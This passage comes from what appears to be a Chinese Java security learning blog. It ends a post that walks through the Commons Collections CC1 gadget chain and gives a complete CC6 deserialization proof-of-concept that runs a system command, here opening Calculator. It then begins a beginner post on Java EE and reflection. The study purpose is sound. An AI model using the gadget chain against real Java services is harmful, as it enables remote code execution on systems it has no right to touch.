class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><pre class="line-numbers language-none"><code class="language-none">ObjectInputStream.readObject()            AnnotationInvocationHandler.readObject()                Map(Proxy).entrySet()                    AnnotationInvocationHandler.invoke()                        LazyMap.get()                            ChainedTransformer.transform()                                ConstantTransformer.transform()                                InvokerTransformer.transform()                                    Method.invoke()                                        Class.getMethod()                                InvokerTransformer.transform()                                    Method.invoke()                                        Runtime.getRuntime()                                InvokerTransformer.transform()                                    Method.invoke()                                        Runtime.exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8u71之后"><a href="#8u71之后" class="headerlink" title="8u71之后"></a>8u71之后</h2><p>在java   8u71后的版本中 <code>AnnotationInvocationHandler</code>  不再使用反序列化得到的 Map 对象，而是新建了一个<code>LinkedHashMap</code> 对象，将原来的键值添加进去，所以后续的操作都是对 <code>LinkedHashMap</code> ，所以我们反序列化攻击没办法成功。</p><p>解决高版本利用问题实际上就是寻找哪里调用了LazyMap#get方法。TiedMapEntry中就存在：</p><p><img src="https://s2.loli.net/2022/03/23/rJ75O9iNCsTEkQF.png" alt="image-20220323164535750"></p><p>我们接着寻找实现了TiedMapEntry#getValue的方法，在不远处就能找到：</p><p><img src="https://s2.loli.net/2022/03/23/GObxMrkuVCKgJlR.png" alt="image-20220323164656471"></p><p>TiedMapEntry#hashcode方法实现了getValue方法，而且我们在之前的URLDNS链子中有讲过hashcode的实现方法。在HashMap的readObject方法中，调用到了 hash(key) ，而hash方法中，调用到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前面的分析过程，构成一个完整的Gadget。</p><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> CC6 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>                        <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token string">"getRuntime"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>                        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token string">"open /System/Applications/Calculator.app"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> <span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span> <span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 生成序列化字符串</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 本地测试触发</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后编辑于 2022年 3月23日 星期三 20时25分21秒 CST</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> poc </tag>
            
            <tag> CommonCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_web学习之路(一)：从啥也不会到反序列化</title>
      <link href="/2022/03/07/java-web/"/>
      <url>/2022/03/07/java-web/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-web学习记录"><a href="#Java-web学习记录" class="headerlink" title="Java web学习记录"></a>Java web学习记录</h1><h2 id="JDK-JRE-JVM-关系"><a href="#JDK-JRE-JVM-关系" class="headerlink" title="JDK JRE JVM 关系"></a>JDK JRE JVM 关系</h2><p>JDK 包含 JRE ， 还包含开发工具，编译 javac  ，反编译 javap ，打包工具 jar。</p><p>JRE是Java程序运行环境，包括JVM，还包含其他程序运行需要的API，如rt.jar。</p><p>JVM是Java运行的核心，用来处理字节码，管理内存。</p><h2 id="Java-EE-分层模型"><a href="#Java-EE-分层模型" class="headerlink" title="Java EE 分层模型"></a>Java EE 分层模型</h2><h3 id="Java-EE-核心"><a href="#Java-EE-核心" class="headerlink" title="Java EE 核心"></a>Java EE 核心</h3><ul><li><strong>Java数据库链接 JDBC</strong>：用来规范客户端程序如何访问数据库的应用程序接口</li><li><strong>Java命名和目录接口 JNDI</strong>：一个API，提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象</li><li><strong>企业级JavaBean EJB</strong>：是一个用来构建企业级应用的在服务端可被管理的组件</li><li><strong>远程方法调用 RMI</strong>：拥护开发分布式应用程序的API</li><li><strong>Servlet</strong>：Java编写的服务端程序，狭义的Servlet是指Java语言实现的一个接口，广义的Servlet指任何实现该Servlet接口的类。主要功能在于交互式地浏览和修改数据，生成动态web内容</li><li><strong>JSP</strong>：一种动态网页技术标准</li><li><strong>XML</strong>：被设计用于传输和储存数据的语言</li><li><strong>Java消息服务 JMS</strong>：一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信</li></ul><h3 id="Java-EE-分层模型-1"><a href="#Java-EE-分层模型-1" class="headerlink" title="Java EE 分层模型"></a>Java EE 分层模型</h3><ul><li>Domain Object层（领域对象层）：由一系列普通、传统的Java对象（POJO）组成，这些对象是该系统的Domain Object，通常包括各自所需实现的业务逻辑方法</li><li>DAO层（数据访问对象层）：由一系列DAO组件组成，这些DAO实现了对数据库的各种操作</li><li>Service层：由一系列业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法</li><li>Controller层：由一系列控制器组成，这些控制器用于拦截用户请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发</li><li>View层：由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果</li></ul><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>Servlet是在Java web容器中运行的小程序，用户使用Servlet来处理一些较为复杂的服务端业务逻辑，通常用作HTTP servlet的简写。</p><img src="https://www.runoob.com/wp-content/uploads/2014/07/servlet-arch.jpg" alt="Servlet 架构"><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><h3 id="反射的定义"><a href="#反射的定义" class="headerlink" title="反射的定义"></a>反射的定义</h3><p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HelloWorld</span> helloworld <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//直接初始化，"正射"</span>helloworld<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面这样子进行类对象的初始化，我们可以理解为”正”。而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用new关键字来创建对象了。这时候，我们使用JDK提供的反射API进行反射调用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> <span class="token keyword">class</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.reflect.ReflectTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"sayhello"</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> object <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；<code>对于任意一个对象，都能够调用它的任意一个方法和属性</code>；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><p>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p><p>反射就是把java类中的各种成分映射成一个个的Java对象</p><p>例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把各个组成部分映射成一个个对象。（其实：一个类中这些成员方法、构造方法、在加入类中都有一个类来描述） 如图是类的正常加载过程：反射的原理在于class对象。熟悉一下加载的时候：Class对象的由来是将class文件读入内存，并为之创建一个Class对象。</p><h3 id="获取Runtime类Class对象代码片段"><a href="#获取Runtime类Class对象代码片段" class="headerlink" title="获取Runtime类Class对象代码片段"></a>获取Runtime类Class对象代码片段</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className     <span class="token operator">=</span> <span class="token string">"java.lang.Runtime"</span><span class="token punctuation">;</span><span class="token class-name">Class</span>  runtimeClass1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span>  runtimeClass2 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span class="token class-name">Class</span>  runtimeClass3 <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过以上任意一种方式就可以获取<strong>java.lang.Runtime</strong>类的<strong>Class</strong>对象了。</p><p>反射调用内部类的时候需要使用**$<strong>来代替</strong>.<strong>,如</strong>com.reflect.ReflectTest<strong>类有一个叫做</strong>Hello<strong>的内部类，那么调用的时候就应该将类名写成：</strong>com.reflect.ReflectTest$Hello**。</p></blockquote><h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><h4 id="使用forName-方法"><a href="#使用forName-方法" class="headerlink" title="使用forName()方法"></a>使用forName()方法</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Class</span> name <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/03/03/EFbAclWq6DfjUvC.png" alt="image-20220211091828362"></p><p><img src="https://s2.loli.net/2022/03/03/v1jPgZmeyILRHo9.png" alt="image-20220211091837203"></p><h4 id="直接获取"><a href="#直接获取" class="headerlink" title="直接获取"></a>直接获取</h4><p>任何数据类型都具有静态的属性，因此可使用.class直接获取其对应的Class对象。需要用到类中的静态成员</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用getClass-方法"><a href="#使用getClass-方法" class="headerlink" title="使用getClass()方法"></a>使用getClass()方法</h4><p>可以通过Object类中的getClass()方法来获取字节码对象。需要指明具体的类，然后创建对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用getSystemClassLoader-loadClass-方法"><a href="#使用getSystemClassLoader-loadClass-方法" class="headerlink" title="使用getSystemClassLoader().loadClass()方法"></a>使用getSystemClassLoader().loadClass()方法</h4><p>getSystemClassLoader().loadClass()与forName()方法类似，只要有类名称即可。区别在于forName()的静态方法JVM会装载类，并且执行static()中的代码；而getSystemClassLoader().loadClass不会执行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h3><h4 id="getDeclaredMethods"><a href="#getDeclaredMethods" class="headerlink" title="getDeclaredMethods()"></a>getDeclaredMethods()</h4><p>getDeclaredMethods()方法返回类或接口声明的所有方法，包括public protected private和默认方法，但不包括继承的方法。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token 